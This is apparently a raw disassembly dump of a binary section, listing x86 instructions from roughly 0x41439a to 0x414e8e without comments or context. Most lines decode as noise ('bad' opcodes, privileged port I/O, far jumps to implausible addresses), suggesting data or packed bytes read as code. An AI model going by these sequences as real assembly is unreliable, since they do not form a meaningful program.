  41439a:	fmul   DWORD PTR ds:0xf6543703
  4143a0:	sti    
  4143a1:	je     0x4143f4
  4143a3:	je     0x4143b1
  4143a5:	fdivr  QWORD PTR [eax]
  4143a7:	sti    
  4143a8:	jmp    0x41432e
  4143aa:	push   ecx
  4143ab:	mov    ah,0xec
  4143ad:	pop    edx
  4143ae:	pop    esi
  4143af:	push   ebx
  4143b0:	fiadd  DWORD PTR [edx]
  4143b2:	test   al,0x19
  4143b4:	shl    ebp,cl
  4143b6:	push   esi
  4143b7:	leave  
  4143b8:	rol    DWORD PTR [ebx],cl
  4143ba:	ret    0xc252
  4143bd:	cmc    
  4143be:	inc    esi
  4143bf:	fnstenv [edi+0x1c259c02]
  4143c5:	pop    ebx
  4143c6:	and    BYTE PTR [esi+0x17],al
  4143c9:	pop    ebx
  4143ca:	xchg   esp,eax
  4143cb:	jle    0x4143cd
	...
  4143f5:	mov    bh,0xd9
  4143f7:	sub    edx,DWORD PTR [eax+0x5]
  4143fa:	pop    ebx
  4143fb:	xchg   ecx,eax
  4143fc:	mov    dh,0x92
  4143fe:	outs   dx,DWORD PTR ds:[esi]
  4143ff:	fistp  WORD PTR [ebx-0x13]
  414402:	sub    DWORD PTR [esi],ecx
  414404:	push   ebx
  414405:	xchg   esp,eax
  414406:	lahf   
  414407:	add    edx,DWORD PTR [ebx-0x10]
  41440a:	bound  ecx,QWORD PTR [edi-0x1863fa9e]
  414410:	push   edx
  414411:	xor    ah,bh
  414413:	lahf   
  414414:	les    esp,FWORD PTR [ebx-0x3]
  414417:	lods   eax,DWORD PTR ds:[esi]
  414418:	push   eax
  414419:	pop    edx
  41441a:	cmc    
  41441b:	(bad)  
  41441d:	sbb    eax,DWORD PTR [ebx+0x5adcddc6]
  414423:	aas    
  414424:	push   es
  414425:	sbb    al,0x5b
  414427:	addr16 pop ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	idiv   DWORD PTR [esi-0x2090cdae]
  414430:	fist   DWORD PTR [ecx]
  414432:	sub    BYTE PTR [eax],0x4
  414435:	and    ebp,DWORD PTR [edi]
  414437:	mov    BYTE PTR [ebx+0x5d8f5b5c],bh
  41443d:	adc    ebp,esi
  41443f:	xchg   esi,eax
  414440:	push   edx
  414441:	nop
  414442:	arpl   di,di
  414444:	stc    
  414445:	jbe    0x4143e1
  414447:	out    0xdb,eax
  414449:	sbb    eax,0xfb83e75b
  41444e:	adc    eax,DWORD PTR [ecx]
  414450:	ja     0x4144a0
  414452:	cmc    
  414453:	std    
  414454:	hlt    
  414455:	push   ebx
  414456:	cmc    
  414457:	jae    0x41444a
	...
  414481:	add    BYTE PTR [edi+0x34],dh
  414484:	xor    DWORD PTR [esi+0x6e],ebx
  414487:	and    eax,ebx
  414489:	in     eax,dx
  41448a:	pop    ds
  41448b:	mov    cs,WORD PTR [ecx-0x2e765c3]
  414491:	rcr    DWORD PTR [edi],cl
  414493:	adc    DWORD PTR [esi+edi*1-0x2c],0x114de85c
  41449b:	hlt    
  41449c:	std    
  41449d:	pusha  
  41449e:	aam    0xf0
  4144a0:	push   0x9b7a9b
  4144a5:	push   ds
  4144a6:	je     0x414504
  4144a8:	call   0xfe36803a
  4144ad:	push   cs
  4144ae:	fs lock std 
  4144b1:	jl     0x41452a
  4144b3:	cld    
  4144b4:	or     eax,0xc7f4ceba
  4144b9:	sub    esp,DWORD PTR [ebx]
  4144bb:	pop    ebx
  4144bc:	push   ebx
  4144bd:	(bad)  
  4144bf:	fadd   st,st(4)
  4144c1:	in     eax,0x96
  4144c3:	lea    ebp,[edx-0x17]
  4144c6:	jno    0x414457
  4144c8:	std    
  4144c9:	pop    esp
  4144ca:	dec    eax
  4144cb:	cld    
  4144cc:	scas   eax,DWORD PTR es:[edi]
  4144cd:	sbb    ebp,ebp
  4144cf:	hlt    
  4144d0:	xchg   DWORD PTR [esp+ecx*8],ebp
  4144d3:	loopne 0x414508
  4144d5:	inc    esp
  4144d6:	jo     0x414473
  4144d8:	add    BYTE PTR [edx+0x1b],ah
  4144db:	or     BYTE PTR [eax+0x28],0x18
  4144df:	fstp   TBYTE PTR ds:0x689ef3e9
  4144e5:	and    eax,DWORD PTR [eax]
	...
  41450f:	icebp  
  414510:	call   0xe920:0x26683e00
  414517:	pop    ds
  414518:	pusha  
  414519:	rol    BYTE PTR [eax],0xf9
  41451c:	jmp    0xfffd:0x4ae7e853
  414523:	add    eax,0x62fffe17
  414528:	leave  
  414529:	gs sub esi,0x724ffe18
  414530:	or     al,0x6
  414532:	call   0x3fee5a
  414537:	pop    ebp
  414538:	push   edx
  414539:	xor    edi,edi
  41453b:	bound  edx,QWORD PTR [esi+0x49454600]
  414541:	add    BYTE PTR [ebp-0x11],dh
  414544:	and    dl,bh
  414546:	xor    esi,ebp
  414548:	(bad)  
  41454a:	inc    DWORD PTR [edx-0x76]
  41454d:	out    dx,eax
  41454e:	scas   al,BYTE PTR es:[edi]
  41454f:	jge    0x4145b3
  414551:	jae    0x41450e
  414553:	xor    cl,BYTE PTR [edx+edi*8]
  414556:	jmp    FWORD PTR [eax-0x486c1a11]
  41455c:	mov    bh,dh
  41455e:	pop    edi
  41455f:	xchg   ebx,eax
  414560:	xor    BYTE PTR [edi-0x75538afc],bh
  414566:	in     al,dx
  414567:	mul    BYTE PTR [edx-0x65ff7c0b]
  41456d:	dec    edx
  41456e:	inc    ecx
  41456f:	inc    ebp
  414570:	push   edi
  414571:	jae    0x414577
	...
  41459b:	add    BYTE PTR [ebp+ebx*4+0x5],bh
  41459f:	add    ch,bl
  4145a1:	pop    ebx
  4145a2:	(bad)  
  4145a3:	inc    DWORD PTR [ebp-0x71]
  4145a6:	or     BYTE PTR ds:0x45888a72,dh
  4145ac:	jno    0x414550
  4145ae:	inc    esp
  4145af:	clc    
  4145b0:	cmp    DWORD PTR [eax+0x0],ebx
  4145b3:	add    BYTE PTR [eax-0x4daf09e7],dl
  4145b9:	or     edx,edi
  4145bb:	call   FWORD PTR [edi+ecx*2]
  4145be:	add    bh,bh
  4145c0:	mov    DWORD PTR [eax],edx
  4145c2:	push   ecx
  4145c3:	adc    al,0xeb
  4145c5:	sub    eax,0xe7f2ffc1
  4145ca:	dec    ebp
  4145cb:	out    0xbf,eax
  4145cd:	or     DWORD PTR [edx],eax
  4145cf:	add    BYTE PTR [edi+0x3176046c],bl
  4145d5:	or     al,0x2
  4145d7:	add    bl,al
  4145d9:	rcr    cl,cl
  4145db:	mov    WORD PTR [edi],?
  4145dd:	ret    
  4145de:	add    edi,edi
  4145e0:	dec    ecx
  4145e1:	mov    al,ds:0x8c247450
  4145e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145e7:	pop    esp
  4145e8:	mov    bl,0x31
  4145ea:	push   eax
  4145eb:	je     0x414595
  4145ed:	pushf  
  4145ee:	pushf  
  4145ef:	xor    esp,DWORD PTR [ebx+0x24c13a41]
  4145f5:	add    al,0xb7
  4145f7:	mov    al,BYTE PTR [eax-0x904ba7b]
  4145fd:	add    ebx,esp
  4145ff:	push   ebp
	...
  414628:	add    BYTE PTR [ebx+0x69e7f9c7],al
  41462e:	mov    bl,0x50
  414630:	(bad)  
  414631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414632:	mov    bh,0x4d
  414634:	addr16 mov ds,ebp
  414637:	ret    0x62ff
  41463a:	addr16 stc 
  41463c:	out    0xd2,eax
  41463e:	clc    
  41463f:	dec    ebp
  414640:	(bad)  
  414641:	push   ebx
  414642:	xchg   DWORD PTR [eax-0x2],edx
  414645:	sar    ebx,1
  414647:	pop    ecx
  414648:	test   DWORD PTR ds:0x5ec84e21,0xa7550200
  414652:	and    BYTE PTR [edx+0x49e28c3],al
  414658:	push   0xffffffcb
  41465a:	rcl    bh,0x7
  41465d:	add    al,0x5b
  41465f:	adc    DWORD PTR ds:0xc970f213,0x7
  414666:	and    edi,0x3
  414669:	repz mov al,0xff
  41466c:	mov    WORD PTR [esi-0x20241864],es
  414672:	test   DWORD PTR [eax],ebp
  414674:	add    al,0xeb
  414676:	fistp  WORD PTR [bp+di-0x66]
  41467a:	(bad)  
  41467b:	outs   dx,BYTE PTR ds:[esi]
  41467c:	dec    edi
  41467d:	fisub  DWORD PTR [edi+0x63]
  414680:	dec    edi
  414681:	dec    eax
  414682:	arpl   WORD PTR [edi-0x6f],cx
  414685:	or     al,0xf2
  414687:	push   esi
  414688:	cmp    eax,0xb8e756dd
	...
  4146b5:	add    BYTE PTR [esi-0x30b79502],ah
  4146bb:	mov    BYTE PTR [esi+0x3f5f304e],dl
  4146c1:	cld    
  4146c2:	in     al,0xf1
  4146c4:	cs sti 
  4146c6:	(bad)  [edi-0x13]
  4146c9:	scas   al,BYTE PTR es:[edi]
  4146ca:	icebp  
  4146cb:	and    ebp,DWORD PTR [edx]
  4146cd:	cld    
  4146ce:	mov    ebx,esi
  4146d0:	lods   al,BYTE PTR ds:[esi]
  4146d1:	push   ebx
  4146d2:	shl    ecx,cl
  4146d4:	xchg   esp,eax
  4146d5:	inc    DWORD PTR [ebx+0x724ec0b3]
  4146db:	gs daa 
  4146dd:	call   FWORD PTR [edi+0x1c03e895]
  4146e3:	bnd je 0x414735
  4146e6:	stos   BYTE PTR es:[edi],al
  4146e7:	xchg   edi,eax
  4146e8:	ret    
  4146e9:	xor    al,0xc0
  4146eb:	push   cs
  4146ec:	(bad)  
  4146ee:	addr16 icebp 
  4146f0:	pop    esp
  4146f1:	dec    esp
  4146f2:	cmp    edx,DWORD PTR [eax]
  4146f4:	sub    ecx,DWORD PTR [edi+0x3a]
  4146f7:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4146f9:	xlat   BYTE PTR ds:[ebx]
  4146fa:	sbb    ah,ah
  4146fc:	and    al,0x60
  4146fe:	xchg   esi,eax
  4146ff:	jmp    0xad73:0xf033c200
  414706:	ja     0x4146f7
  414708:	xor    DWORD PTR [esi-0x72bc1c9e],esp
  41470e:	pop    edx
  41470f:	addr16 cld 
  414711:	xchg   esi,eax
  414712:	in     al,0x4
  414714:	(bad)  
  414715:	adc    al,0x68
  414717:	clc    
  414718:	and    DWORD PTR [ebp+0x0],edi
	...
  414742:	add    BYTE PTR [edx-0xf],ah
  414745:	mov    esp,esi
  414747:	dec    ebx
  414748:	add    esp,ecx
  41474a:	jmp    0x74fea26e
  41474f:	neg    BYTE PTR [ebx-0x7764200]
  414755:	inc    ebp
  414756:	or     DWORD PTR [eax],esp
  414758:	pop    ebx
  414759:	or     DWORD PTR [ecx],ebp
  41475b:	jmp    0x4147b7
  41475d:	jmp    0xc06eb35c
  414762:	and    BYTE PTR [edx-0xf],0xfd
  414766:	ds dec ebp
  414768:	mov    esi,0xf7c4ee38
  41476d:	out    0x21,eax
  41476f:	pop    ds
  414770:	pop    ebx
  414771:	add    BYTE PTR [edx-0x11],dh
  414774:	ja     0x414766
  414776:	xchg   edx,eax
  414777:	pusha  
  414778:	lock push ebx
  41477a:	add    DWORD PTR [edx+0x76e90050],eax
  414780:	mov    al,0x73
  414782:	in     al,dx
  414783:	shr    BYTE PTR [ecx-0x64e01700],1
  414789:	mov    ecx,edi
  41478b:	out    0x66,eax
  41478d:	call   0x3fc63513
  414792:	jmp    0x9474020
  414797:	and    BYTE PTR [ebx+0x9],bl
  41479a:	test   eax,0x71e7576b
  41479f:	and    BYTE PTR [ebx+0x0],bl
  4147a2:	add    BYTE PTR [edi+0xc3e6],ch
	...
  4147d0:	xor    eax,0xe0ff4fac
  4147d5:	mov    fs,ebp
  4147d7:	aas    
  4147d8:	jmp    0x414835
  4147da:	add    BYTE PTR [ebx],cl
  4147dc:	lds    edx,FWORD PTR [edx]
  4147de:	jb     0x414769
  4147e0:	inc    eax
  4147e1:	cmp    esi,0x75
  4147e4:	popf   
  4147e5:	mov    ds,WORD PTR [ebx]
  4147e7:	inc    ebx
  4147e8:	stos   BYTE PTR es:[edi],al
  4147e9:	popf   
  4147ea:	mov    BYTE PTR [ebp-0x5b],al
  4147ed:	popf   
  4147ee:	je     0x4147d4
  4147f0:	push   0x8
  4147f2:	fsubp  st(0),st
  4147f4:	cmc    
  4147f5:	pop    ss
  4147f6:	(bad)  
  4147f7:	(bad)  
  4147f8:	mov    esi,0x144f719b
  4147fd:	adc    dl,ah
  4147ff:	push   DWORD PTR [eax]
  414801:	(bad)
  414805:	outs   dx,BYTE PTR ds:[esi]
  414806:	inc    esp
  414807:	fsubr  DWORD PTR [edx+0x48]
  41480a:	in     al,dx
  41480b:	imul   eax,DWORD PTR [ebx+ebx*2+0x7011458d],0x44
  414813:	aam    0x85
  414815:	jo     0x41485b
  414817:	in     al,0xb5
  414819:	sahf   
  41481a:	je     0x4147fc
  41481c:	sub    eax,0x2aff59b7
  414821:	repnz mov ebp,0x1135374
  414827:	add    BYTE PTR [edx-0x23],bh
  41482a:	(bad)  
  41482b:	jne    0x41489a
  41482d:	xchg   ebx,eax
  41482e:	ret    0x6a2f
  414831:	sahf   
  414832:	(bad)  
  414833:	jne    0x414835
	...
  41485d:	sbb    eax,0x1d08749e
  414862:	add    eax,0x9e3aff2e
  414867:	je     0x41484d
  414869:	push   0x8
  41486b:	fdivp  st(7),st
  41486d:	sbb    al,0x8f
  41486f:	cld    
  414870:	out    0x3c,eax
  414872:	lock dec esp
  414874:	(bad)  
  414875:	xor    ebp,DWORD PTR [esi]
  414877:	fs out 0x2d,eax
  41487a:	repz dec esp
  41487c:	inc    dh
  41487e:	dec    ecx
  41487f:	jl     0x414890
  414881:	daa    
  414882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414883:	aad    0x8
  414885:	pushf  
  414886:	test   BYTE PTR [ecx],0xf
  414889:	mov    eax,ds:0x3fe4cf1
  41488e:	pop    ebp
  41488f:	add    al,BYTE PTR [eax]
  414891:	or     ebx,DWORD PTR [edi-0x33db8bb4]
  414897:	test   DWORD PTR [esi],ebp
  414899:	jmp    0x414908
  41489b:	dec    esp
  41489c:	je     0x41487e
  41489e:	gs (bad) 
  4148a0:	neg    ebx
  4148a2:	out    0xf9,eax
  4148a4:	out    0x80,eax
  4148a6:	inc    ebp
  4148a7:	dec    ebx
  4148a8:	dec    bl
  4148aa:	pop    es
  4148ab:	pop    esi
  4148ac:	out    0x81,eax
  4148ae:	push   edx
  4148af:	dec    ebx
  4148b0:	(bad)  
  4148b1:	test   eax,0xc44f51b7
  4148b6:	mov    BYTE PTR [ecx],cl
  4148b8:	jmp    FWORD PTR [ebx+0x425f0189]
  4148be:	cmp    edi,DWORD PTR [edi]
  4148c0:	pop    es
	...
  4148e9:	add    BYTE PTR [edi+eax*8],bl
  4148ec:	js     0x4148d9
  4148ee:	xchg   ebx,eax
  4148ef:	iret   
  4148f0:	std    
  4148f1:	(bad)  
  4148f2:	adc    esp,ebp
  4148f4:	pop    ecx
  4148f5:	bound  eax,QWORD PTR [edx+0x5ec84c45]
  4148fb:	adc    BYTE PTR [edx],al
  4148fd:	push   ebp
  4148fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ff:	dec    eax
  414900:	dec    esp
  414901:	je     0x41491b
  414903:	dec    esp
  414904:	fs xor eax,0xbff5e563
  41490a:	shl    BYTE PTR [eax],1
  41490c:	dec    ebp
  41490d:	je     0x41493b
  41490f:	pop    ebx
  414910:	aaa    
  414911:	pop    esp
  414912:	shl    BYTE PTR [esi+ebx*8],1
  414915:	dec    ebx
  414916:	rol    DWORD PTR [edx+0x5afb61db],cl
  41491c:	into   
  41491d:	ror    DWORD PTR [ebx],1
  41491f:	out    dx,al
  414920:	cmp    al,0xf0
  414922:	fucomi st,st(5)
  414924:	xor    al,0xfc
  414926:	cmp    esp,DWORD PTR [edi+0x31a4b10]
  41492c:	inc    eax
  41492d:	push   ss
  41492e:	adc    ebp,esi
  414930:	mov    al,0x46
  414932:	das    
  414933:	pop    ebx
  414934:	xor    al,0x7f
  414936:	test   DWORD PTR [edx-0x52f4fc19],0x9c862bff
  414940:	out    0x4a,eax
  414942:	jo     0x4149a3
  414944:	adc    esi,ebp
  414946:	loop   0x4149af
  414948:	fistp  WORD PTR [ebx-0x75]
  41494b:	in     eax,dx
  41494c:	outs   dx,BYTE PTR ds:[esi]
  41494d:	dec    ebx
	...
  414976:	add    BYTE PTR [ebx],bh
  414978:	pop    ebx
  414979:	out    0x5a,eax
  41497b:	mov    DWORD PTR [edx+0x5b5cdf3f],eax
  414981:	push   esi
  414982:	shl    DWORD PTR [edi],1
  414984:	sub    ebx,0x4f63284a
  41498a:	ins    DWORD PTR es:[edi],dx
  41498b:	stos   BYTE PTR es:[edi],al
  41498c:	in     eax,dx
  41498d:	fsub   QWORD PTR ds:[ebx+0x38a46ed]
  414994:	adc    eax,ebx
  414996:	les    edx,FWORD PTR [ebx-0xa086314]
  41499c:	cmp    DWORD PTR [esi],ebx
  41499e:	rcr    DWORD PTR [ebx],1
  4149a0:	add    ebp,DWORD PTR [edx+0x4b]
  4149a3:	jp     0x414992
  4149a5:	and    BYTE PTR [esi+0x1b],al
  4149a8:	pop    ebx
  4149a9:	pushf  
  4149aa:	jle    0x414a23
  4149ac:	or     BYTE PTR [ebx],0xdf
  4149af:	fcomp  QWORD PTR [edx+0x0]
  4149b2:	add    edx,0xe6e93f80
  4149b8:	data16 adc dh,ah
  4149bb:	sub    al,0xfc
  4149bd:	dec    eax
  4149be:	sub    BYTE PTR [eax],bl
  4149c0:	add    edx,DWORD PTR [esp+ebx*1]
  4149c3:	out    0xec,eax
  4149c5:	or     DWORD PTR [ecx-0x2e5eaf9d],ebp
  4149cb:	dec    edx
  4149cc:	call   0x3cfd:0x614cbe00
  4149d3:	sbb    ch,dh
  4149d5:	sub    DWORD PTR [esi-0x2302129a],0x0
	...
  414a04:	cmp    DWORD PTR [bx],0x300e67e9
  414a0b:	xchg   esi,eax
  414a0c:	and    ax,bx
  414a0f:	fstp   QWORD PTR [edi]
  414a11:	xchg   BYTE PTR [ecx-0x2e75d6b],cl
  414a17:	adc    ebx,DWORD PTR [eax]
  414a19:	adc    DWORD PTR [edi+0x76],0xe9e854ec
  414a20:	ss in  al,dx
  414a22:	std    
  414a23:	jo     0x414a01
  414a25:	lock push 0x9bebb6
  414a2b:	shr    DWORD PTR [ecx],0x7f
  414a2e:	aas    
  414a2f:	jmp    0x5149b19a
  414a34:	cmp    ch,ch
  414a36:	std    
  414a37:	ds push esi
  414a39:	addr16 cld 
  414a3b:	ss ins BYTE PTR es:[edi],dx
  414a3d:	push   esp
  414a3e:	call   0xfe2d814a
  414a43:	xor    cl,ah
  414a45:	push   edi
  414a46:	add    BYTE PTR [edx+eax*1-0x1cd27e00],dh
  414a4d:	add    DWORD PTR [eax],0x73edc783
  414a53:	add    BYTE PTR [ebp-0x70],ch
  414a56:	(bad)  
  414a57:	bound  esp,QWORD PTR cs:[edx+0x11514588]
  414a5e:	xchg   edx,eax
  414a5f:	ins    BYTE PTR es:[edi],dx
  414a60:	test   BYTE PTR [eax+0x68],bl
  414a63:	jl     0x414a56
  414a65:	pop    ss
  414a66:	(bad)  
  414a67:	inc    BYTE PTR [eax]
	...
  414a91:	call   0x52a73084
  414a96:	mov    ds:0xa2c8fffe,al
  414a9b:	(bad)  
  414a9c:	jne    0x414acb
  414a9e:	nop
  414a9f:	in     eax,dx
  414aa0:	bound  esp,QWORD PTR cs:[edx+0x5809c2c8]
  414aa7:	push   ebx
  414aa8:	mov    edx,ecx
  414aaa:	aad    0xc1
  414aac:	cld    
  414aad:	das    
  414aae:	push   edi
  414aaf:	push   0x5a
  414ab1:	mov    ds:0x79e8061b,al
  414ab6:	push   ecx
  414ab7:	std    
  414ab8:	(bad)  
  414ab9:	jl     0x414a67
  414abb:	stc    
  414abc:	push   0xfffffff5
  414abe:	psrlw  mm5,QWORD PTR [esp+esi*1+0x57]
  414ac3:	push   0xfe1821b4
  414ac8:	dec    BYTE PTR [eax-0x4abeba88]
  414ace:	(bad)  
  414acf:	push   edi
  414ad0:	xor    al,0x62
  414ad2:	mov    ds:0xd9c00a,al
  414ad7:	dec    esi
  414ad8:	push   0xbeed57c5
  414add:	int    0x8b
  414adf:	imul   eax,DWORD PTR [ecx-0x4b],0x7d75fea7
  414ae6:	(bad)  
  414ae7:	sbb    DWORD PTR [edx+0x42],ebx
  414aea:	mov    ds:0xa26425e5,al
  414aef:	(bad)  
  414af0:	push   0x75
  414af2:	psrlw  mm5,QWORD PTR [eax+eax*1+0x0]
	...
  414b1b:	add    BYTE PTR [eax],al
  414b1d:	add    BYTE PTR [ebx+eax*8],bl
  414b20:	add    DWORD PTR [eax-0x58],ebp
  414b23:	ins    DWORD PTR es:[edi],dx
  414b24:	ret    0x3ff
  414b27:	add    BYTE PTR [edx],al
  414b29:	add    BYTE PTR [ecx+ecx*2-0x1ba4cbe1],bl
  414b30:	cld    
  414b31:	mov    edi,0x67b20ac8
  414b36:	sbb    al,0x2
  414b38:	pop    ecx
  414b39:	mov    ebp,0x40d615b4
  414b3e:	sbb    al,0x32
  414b40:	inc    edi
  414b41:	je     0x414b67
  414b43:	sbb    bl,BYTE PTR [ebx+0x58]
  414b46:	sub    edx,DWORD PTR [edx+ebx*2]
  414b49:	icebp  
  414b4a:	in     al,dx
  414b4b:	lods   al,BYTE PTR ds:[esi]
  414b4c:	dec    eax
  414b4d:	imul   ebx,DWORD PTR [esp+ebx*4],0xf45d6b29
  414b54:	fnstenv [ebx-0xfbcc88]
  414b5a:	dec    ecx
  414b5b:	sar    DWORD PTR [ecx+0x54dc1c40],cl
  414b61:	xor    dh,bl
  414b63:	frndint 
  414b65:	mov    edi,0x67b1fb70
  414b6a:	sbb    al,0xf4
  414b6c:	pop    eax
  414b6d:	mov    ebp,0x40d5d844
  414b72:	sbb    al,0x44
  414b74:	inc    edi
  414b75:	je     0x414b8b
  414b77:	mov    WORD PTR [esi+0x5989c358],cs
  414b7d:	mov    ebp,0x694890ec
	...
  414baa:	add    BYTE PTR [esp+ebx*1],bl
  414bad:	sub    ebp,DWORD PTR [ebx+0x5d]
  414bb0:	hlt    
  414bb1:	fnstenv [ebx+0x6801b330]
  414bb7:	push   ds
  414bb8:	hlt    
  414bb9:	add    DWORD PTR [eax-0xebcb7c],eax
  414bbf:	mov    ebx,DWORD PTR [ebx-0xe]
  414bc2:	inc    ebx
  414bc3:	cmove  esi,DWORD PTR [edi+0x6ea7bdb]
  414bca:	mov    ebx,edi
  414bcc:	(bad)  
  414bcd:	jnp    0x414b91
  414bcf:	imul   ebx,DWORD PTR [edx-0xce431fa],0x69
  414bd6:	stos   BYTE PTR es:[edi],al
  414bd7:	pop    edx
  414bd8:	jmp    0x47ee:0xea037bff
  414bdf:	shl    dh,1
  414be1:	out    0xd1,al
  414be3:	sbb    esi,ebx
  414be5:	fstp   QWORD PTR [ecx]
  414be7:	cmp    ebp,edx
  414be9:	mov    al,ds:0x345b1f42
  414bee:	jnp    0x414c27
  414bf0:	fsubr  QWORD PTR [ebx-0x4115d5a4]
  414bf6:	fsub   QWORD PTR [eax]
  414bf8:	pop    esp
  414bf9:	out    0x3,eax
  414bfb:	add    al,0xdb
  414bfd:	test   DWORD PTR [esi+0xa],0xa5c6cd4
  414c04:	jmp    0x4737:0xe760799e
  414c0b:	push   0xd18e57
	...
  414c38:	and    esi,ebx
  414c3a:	ins    DWORD PTR es:[edi],dx
  414c3b:	call   0x44343623
  414c40:	sub    ah,al
  414c42:	loop   0x414c48
  414c44:	sbb    al,0x5b
  414c46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c47:	rcl    ebx,0x5a
  414c4a:	out    0x3,eax
  414c4c:	sbb    al,0x22
  414c4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c4f:	dec    edi
  414c50:	mov    edx,0x4603e761
  414c55:	pop    ebx
  414c56:	rol    DWORD PTR [ebx],0x36
  414c59:	pop    ebx
  414c5a:	rol    DWORD PTR [ebx],1
  414c5c:	xchg   ecx,eax
  414c5d:	lahf   
  414c5e:	xor    esi,DWORD PTR [eax+ebp*4-0x1cc2ff21]
  414c65:	call   0x6f23e667
  414c6a:	clc    
  414c6b:	es ins DWORD PTR es:[edi],dx
  414c6d:	in     eax,0xe8
  414c6f:	rol    DWORD PTR [ebx-0x201d0217],0x6d
  414c76:	add    eax,DWORD PTR [eax]
  414c78:	xor    ch,dl
  414c7a:	std    
  414c7b:	jmp    0xa889f2c7
  414c80:	pop    ds
  414c81:	jmp    0xee31:0xb2f7e573
  414c88:	loop   0x414c23
  414c8a:	mov    DWORD PTR [ecx-0x290b213c],edi
  414c90:	loop   0x414c7a
  414c92:	push   eax
  414c93:	cmp    edx,eax
  414c95:	ret    0xce31
  414c98:	loop   0x414c6c
  414c9a:	cmp    DWORD PTR [ecx+0x0],0x0
	...
  414cc5:	shr    al,cl
  414cc7:	std    
  414cc8:	shl    DWORD PTR [edx+0x39],1
  414ccb:	std    
  414ccc:	mov    dh,0xf5
  414cce:	call   0x9c263038
  414cd3:	add    BYTE PTR [esi-0x610a0754],ah
  414cd9:	(bad)  
  414cda:	jmp    0xea992e52
  414cdf:	xor    cl,BYTE PTR [esi-0x6a7c2c9e]
  414ce5:	push   edx
  414ce6:	jmp    0xf4e5b7e8
  414ceb:	cmc    
  414cec:	jbe    0x414d48
  414cee:	call   0x5a296764
  414cf3:	imul   ebp,DWORD PTR [eax+0x4db3e81f],0x6a
  414cfa:	jmp    0x2dc68efc
  414cff:	std    
  414d00:	dec    esi
  414d01:	outs   dx,DWORD PTR ds:[esi]
  414d02:	cwde   
  414d03:	push   0x5fb100
  414d08:	add    BYTE PTR [edx-0x35],bl
  414d0b:	in     eax,0xf7
  414d0d:	dec    edx
  414d0e:	mov    eax,ds:0x1fbdbf65
  414d13:	(bad)  
  414d14:	addr16 push edx
  414d16:	add    eax,DWORD PTR [ecx+0x0]
  414d19:	lea    eax,[ecx]
  414d1b:	ins    DWORD PTR es:[edi],dx
  414d1c:	inc    ecx
  414d1d:	test   DWORD PTR [edi+edi*1-0x7ea38ae5],eax
  414d24:	clc    
  414d25:	jbe    0x414d3d
  414d27:	push   ss
  414d28:	push   0x0
	...
  414d51:	add    BYTE PTR [ebp+0x5c],al
  414d54:	in     eax,dx
  414d55:	mov    esi,0x416b4c9d
  414d5a:	xor    eax,0x62e8b4a1
  414d5f:	sahf   
  414d60:	(bad)  
  414d61:	call   eax
  414d63:	out    dx,al
  414d64:	in     eax,0x6f
  414d66:	in     eax,dx
  414d67:	popf   
  414d68:	(bad)  
  414d69:	call   0x3e9b3b
  414d6e:	pop    edx
  414d6f:	sbb    BYTE PTR [esi],cl
  414d71:	call   DWORD PTR [eax-0x35000971]
  414d77:	popf   
  414d78:	je     0x414d82
  414d7a:	fld    QWORD PTR [ecx-0x62450005]
  414d80:	mov    ah,0xf0
  414d82:	xchg   edx,eax
  414d83:	popf   
  414d84:	(bad)  
  414d85:	call   0x3e9bb3
  414d8a:	call   0xe59d:0x9af7e9d7
  414d91:	push   ecx
  414d92:	jmp    0xe897:0xfffe9e
  414d99:	add    al,0x3a
  414d9b:	sahf   
  414d9c:	(bad)  
  414d9d:	jmp    eax
  414d9f:	lahf   
  414da0:	in     eax,0x6d
  414da2:	push   ds
  414da3:	pop    edi
  414da4:	add    bh,bh
  414da6:	sbb    al,0xc7
  414da8:	pop    esp
  414da9:	imul   BYTE PTR [ebx-0xccaa368]
  414daf:	mov    al,ds:0xf55ec843
  414db4:	add    DWORD PTR [ebp+0x0],edx
	...
  414ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414de0:	popf   
  414de1:	jg     0x414da6
  414de3:	mov    BYTE PTR [ebx],bl
  414de5:	add    ch,BYTE PTR [edx-0x19]
  414de8:	inc    eax
  414de9:	int    0x7
  414deb:	test   BYTE PTR [ecx],bl
  414ded:	push   ss
  414dee:	push   DWORD PTR [ebx+0x7a]
  414df1:	mov    ebp,0xf9ce6bfb
  414df6:	ins    BYTE PTR es:[di],dx
  414df8:	int    0xc2
  414dfa:	call   FWORD PTR [edx-0x52]
  414dfd:	bound  eax,QWORD PTR [edi-0x23]
  414e00:	icebp  
  414e01:	pop    ecx
  414e02:	lea    ecx,[edx-0x8]
  414e05:	inc    esp
  414e06:	dec    cl
  414e08:	jmp    0x330a3de6
  414e0d:	add    al,0x68
  414e0f:	push   ds
  414e10:	repnz add DWORD PTR [eax-0x1b96acc],eax
  414e17:	and    ecx,DWORD PTR [ecx+0x670b0004]
  414e1d:	fldcw  WORD PTR [edi]
  414e1f:	xor    DWORD PTR [ebx],0x27496804
  414e25:	sar    edi,0x2
  414e28:	dec    eax
  414e29:	cld    
  414e2a:	out    0x1a,eax
  414e2c:	pushf  
  414e2d:	inc    ebx
  414e2e:	(bad)  
  414e2f:	repz inc edi
  414e31:	dec    eax
  414e32:	(bad)  
  414e33:	jno    0x414e31
  414e35:	pop    ecx
  414e36:	push   ebx
  414e37:	xor    ch,bl
  414e39:	inc    esp
  414e3a:	enter  0xde,0x2
  414e3e:	push   ebp
  414e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e40:	loopne 0x414dc4
  414e42:	ret    
	...
  414e6b:	add    BYTE PTR [ebp+ebp*2+0x5b91fe44],al
  414e72:	lods   al,BYTE PTR ds:[esi]
  414e73:	inc    edi
  414e74:	imul   esp,esi,0xffffffd4
  414e77:	div    DWORD PTR [edx-0x48a42090]
  414e7d:	inc    ecx
  414e7e:	out    0x3,eax
  414e80:	pop    ss
  414e81:	sbb    esi,edi
  414e83:	jle    0x414e07
  414e85:	pop    ecx
  414e86:	out    0x3,eax
  414e88:	pop    ebx
  414e89:	mov    al,ds:0x5b1c032f
  414e8e:	out    0x3c,eax
